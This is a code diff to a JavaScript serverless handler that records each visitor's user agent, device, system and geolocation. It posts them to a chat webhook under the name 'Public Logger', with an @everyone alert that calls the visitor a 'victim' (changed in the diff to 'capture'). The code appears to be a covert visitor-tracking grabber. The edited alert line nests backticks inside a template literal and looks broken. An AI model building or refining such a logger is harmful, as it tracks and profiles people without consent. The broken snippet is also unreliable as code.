@@ -31,7 +31,7 @@ module.exports = async function handler(req, res) {
     return "Unknown";
   })();
 
-  const device = /mobile|android|iphone/i.test(ua) ? "📱 Mobile" : /ipad|tablet/i.test(ua) ? "📟 Tablet" : "🖥️ Desktop";
+  const device = /mobile|android|iphone/i.test(ua) ? "Mobile 📱" : /ipad|tablet/i.test(ua) ? "Tablet 📟" : "Desktop 🖥️";
   const system = /windows/i.test(ua) ? "Windows" : /android/i.test(ua) ? "Android" : /iphone|ios/i.test(ua) ? "iOS" : /mac/i.test(ua) ? "MacOS" : /linux/i.test(ua) ? "Linux" : "Unknown";
 
   let geo = {};
@@ -52,13 +52,13 @@ module.exports = async function handler(req, res) {
       { name: "📜 User Agent", value: "```" + ua.substring(0, 150) + "```", inline: false }
     ],
     footer: {
-      text: `Público · ${endpoint} · ${new Date().toLocaleString()}`
+      text: `Público - ${endpoint} · ${new Date().toLocaleString()}`
     },
     timestamp: new Date().toISOString()
   };
 
   const payload = {
-    content: `@everyone NUEVA VÍCTIMA EN ${endpoint}`,
+    content: `🚨 @everyone NUEVA CAPTURA: ``${endpoint}`` 🚨`,
     allowed_mentions: { parse: ["everyone"] },
     username: "Public Logger",
     embeds: [embed]
